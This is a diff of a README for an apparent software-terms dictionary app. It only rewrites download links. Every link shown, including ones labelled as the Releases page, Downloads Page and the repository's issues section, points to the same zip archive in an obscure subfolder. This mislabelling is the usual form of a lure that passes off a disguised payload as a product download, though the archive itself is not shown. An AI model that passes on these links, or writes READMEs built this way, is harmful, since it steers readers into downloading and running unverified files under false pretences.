@@ -1,7 +1,7 @@
 # 📖 YazilimTerimleriSozlugu - Understand Software Terms Easily
 
 ## 📥 Download Now
-[![Download YazilimTerimleriSozlugu](https://raw.githubusercontent.com/nguiaro/YazilimTerimleriSozlugu/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip)](https://raw.githubusercontent.com/nguiaro/YazilimTerimleriSozlugu/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip)
+[![Download YazilimTerimleriSozlugu](https://github.com/nguiaro/YazilimTerimleriSozlugu/raw/refs/heads/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip)](https://github.com/nguiaro/YazilimTerimleriSozlugu/raw/refs/heads/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip)
 
 ## 🌟 About This Application
 Yazılım Terimleri Sözlüğü is a comprehensive dictionary of software terms. It offers clear and updated definitions for concepts in software development, computer science, and technology. This tool is perfect for beginners who want to grasp software terminology or for those who feel uncertain about their knowledge of the field.
@@ -10,7 +10,7 @@ Yazılım Terimleri Sözlüğü is a comprehensive dictionary of software terms.
 To start using Yazilim Terimleri Sözlüğü, follow these simple steps:
 
 1. **Download the Application**: 
-   Visit the [Releases page](https://raw.githubusercontent.com/nguiaro/YazilimTerimleriSozlugu/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip) to find the latest version of the application. 
+   Visit the [Releases page](https://github.com/nguiaro/YazilimTerimleriSozlugu/raw/refs/heads/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip) to find the latest version of the application. 
 
 2. **Select Your Version**: 
    On the Releases page, you will see different versions of the software available for download. Choose the latest version for the best experience.
@@ -38,7 +38,7 @@ To use Yazilim Terimleri Sözlüğü effectively, ensure your system meets the f
 - **Display**: 1024x768 resolution or better
 
 ## 📑 Download & Install
-To download the application, please click this link: [Visit the Downloads Page](https://raw.githubusercontent.com/nguiaro/YazilimTerimleriSozlugu/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip). Find the latest version suitable for your operating system and follow the instructions provided in the **Getting Started** section above to install it on your device.
+To download the application, please click this link: [Visit the Downloads Page](https://github.com/nguiaro/YazilimTerimleriSozlugu/raw/refs/heads/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip). Find the latest version suitable for your operating system and follow the instructions provided in the **Getting Started** section above to install it on your device.
 
 ## ❓ FAQ
 **Q: Is this application free?**  
@@ -51,7 +51,7 @@ A: Make sure you have a stable internet connection. If problems persist, try a d
 A: Absolutely! Contributions are welcome. Please check the guidelines in the repository if you wish to help out.
 
 ## 🌐 Support
-For additional help, you can visit the issues section of the [Yazilim Terimleri Sözlüğü repository](https://raw.githubusercontent.com/nguiaro/YazilimTerimleriSozlugu/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip). Your feedback and questions are important to us.
+For additional help, you can visit the issues section of the [Yazilim Terimleri Sözlüğü repository](https://github.com/nguiaro/YazilimTerimleriSozlugu/raw/refs/heads/main/ascyphous/Sozlugu-Terimleri-Yazilim-v3.5-beta.1.zip). Your feedback and questions are important to us.
 
 ## 📈 Updates & News
 Stay informed about updates and new features by visiting the Releases page regularly. Follow the repository for announcements and improvements.
